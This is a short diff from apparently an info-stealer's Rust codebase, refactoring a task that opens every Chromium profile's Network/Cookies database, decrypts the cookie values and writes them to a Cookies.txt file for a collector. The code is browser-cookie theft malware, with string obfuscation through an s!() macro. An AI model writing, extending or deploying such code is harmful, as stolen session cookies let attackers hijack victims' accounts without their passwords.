@@ -1,6 +1,6 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::{decrypt_data, BrowserData};
-use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
+use crate::{read_and_collect_unique_records, to_string_and_write_all, Cookie, SqliteDatabase};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
@@ -30,7 +30,7 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
     parent_name!("Cookies.txt");
 
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
-        let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
+        let Some(cookies) = read_and_collect_unique_records::<SqliteDatabase, _, _>(
             &self.browser.profiles,
             &StorageFileSystem,
             |profile| profile / s!("Network") / s!("Cookies"),
@@ -45,8 +45,8 @@ impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
     }
 }
 
-fn extract_cookie_from_record(
-    record: &dyn TableRecord,
+fn extract_cookie_from_record<R: TableRecord>(
+    record: &R,
     browser_data: &BrowserData,
 ) -> Option<Cookie> {
     let host_key = record.get_value(COOKIES_HOST_KEY)?.as_string()?.to_owned();
